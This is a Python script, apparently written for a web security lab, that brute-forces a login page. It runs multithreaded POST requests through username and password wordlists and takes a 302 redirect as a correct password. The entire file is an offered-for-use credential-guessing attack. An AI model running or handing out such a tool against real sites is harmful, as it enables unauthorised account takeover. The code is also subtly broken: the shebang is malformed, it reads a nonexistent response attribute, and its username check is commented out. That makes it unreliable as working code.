#/bin/python3

import signal
from pwn import *
import pdb
import requests
import string
import threading

def sigint_handler(signal, frame):
    print("\n\n [*] Saliendo... \n")
    sys.exit(1)
#Ctrl+c
signal.signal(signal.SIGINT, sigint_handler)

if (len(sys.argv) < 2):
    log.failure("Uso %s <url-lab> <threads(default=20)>" % sys.argv[0])
    sys.exit(1)

#Global vars
url = sys.argv[1] + 'login'

if len(sys.argv) == 3:
    threads = int(sys.argv[2])
else:
    threads = 20

def makeRequestUsername(s,url,data,data_founded,debug):
    if debug:
        pdb.set_trace()
    r = s.post(url, data=data)
    #if r.status_code == 200 and 'Invalid username or password.' not in r.text:
    data_founded.append((data['username'],r.time))

def makeRequestPwd(s,url,data,pwd_founded,debug):
    if debug:
        pdb.set_trace()
    r = s.post(url, data=data, allow_redirects = False)
    if (r.status_code == 302):
        pwd_founded.append(data['password'])

def enumerate_username(p1,p2):
    s = requests.Session()
    thread_list = []
    username_found = []
    with open('users_list','r') as usernames_file:
        username = usernames_file.readline()
        while username != '':
            for i in range(0,threads):
                if username != '': 
                    data = {'username': username[:-1],'password':'password'}
                    t = threading.Thread(target=makeRequestUsername,args=[s,url,data,username_found,False])
                    thread_list.append(t)
                    t.start()
                else:
                    break
                username = usernames_file.readline()

            for thread in thread_list:
                thread.join()

    return username_found[0]

            
def find_pwd(p1,p2,username):
    s = requests.Session()
    thread_list = []
    p1.status("Finding pwd")
    password_found = []
    with open('pwd_list','r') as password_file:
        password = password_file.readline()
        while password != '':
            for i in range(0,threads):
                if password != '': 
                    data = {'username': username,'password':password[:-1]}
                    t = threading.Thread(target=makeRequestPwd,args=[s,url,data,password_found,False])
                    thread_list.append(t)
                    t.start()
                else:
                    break
                password = password_file.readline()

            for thread in thread_list:
                thread.join()

    return password_found[0]


def atack_bf():
    p1 = log.progress("Brute Force")
    p2 = log.progress("Username")
    time.sleep(2)
    username = enumerate_username(p1,p2)
    p2.status(username)
    p3 = log.progress("Password")
    pwd = find_pwd(p1,p2, username)
    p3.status(pwd)


if __name__ == "__main__":
    atack_bf()
